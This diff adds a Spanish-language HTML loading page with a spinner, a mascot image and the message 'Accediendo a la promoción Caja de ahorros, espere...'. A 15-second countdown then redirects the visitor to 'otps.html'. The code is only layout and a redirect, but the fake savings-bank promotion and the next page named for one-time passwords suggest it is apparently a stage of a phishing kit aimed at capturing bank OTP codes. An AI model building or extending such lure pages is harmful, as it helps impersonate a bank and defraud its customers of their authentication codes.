@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #EFEFEF;
+            font-family: Arial, sans-serif;
+        }
+
+        .loading-container {
+            text-align: center;
+        }
+
+        .loading-spinner {
+            border: 8px solid #f3f3f3; /* Color de fondo */
+            border-top: 8px solid #0f7a83; /* Color del spinner */
+            border-radius: 50%;
+            width: 45px; /* Tamaño del spinner */
+            height: 45px; /* Tamaño del spinner */
+            animation: spin 1s linear infinite; /* Animación de rotación */
+            margin: 20px auto; /* Espaciado */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 20px;
+            color: #333;
+            margin-top: 10px; /* Espaciado entre el spinner y el texto */
+        }
+
+        .counter {
+            font-size: 22px; /* Tamaño del contador */
+            color: #0f7a83; /* Color del contador */
+            margin-top: 10px; /* Espaciado entre el texto y el contador */
+        }
+
+        .image {
+            margin-top: 20px; /* Espaciado entre el contador y la imagen */
+            max-width: 40%; /* Asegura que la imagen no exceda el ancho del contenedor */
+            height: auto; /* Mantiene la proporción de la imagen */
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Accediendo a la promoción Caja de ahorros, espere...</div>
+        <div class="counter" id="counter">15</div> <!-- Contador inicial -->
+        <img src="mascota.png" alt="Descripción de la imagen" class="image"> <!-- Imagen que se añadirá -->
+    </div>
+
+    <script>
+        let timeLeft = 15; // Tiempo en segundos
+        const counterElement = document.getElementById('counter');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            counterElement.textContent = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                // Redirigir a otra página
+                window.location.href = 'otps.html'; // Cambia 'otps.html' por la URL deseada
+            }
+        }, 1000); // Ejecutar cada 1000 ms (1 segundo)
+    </script>
+</body>
+</html>
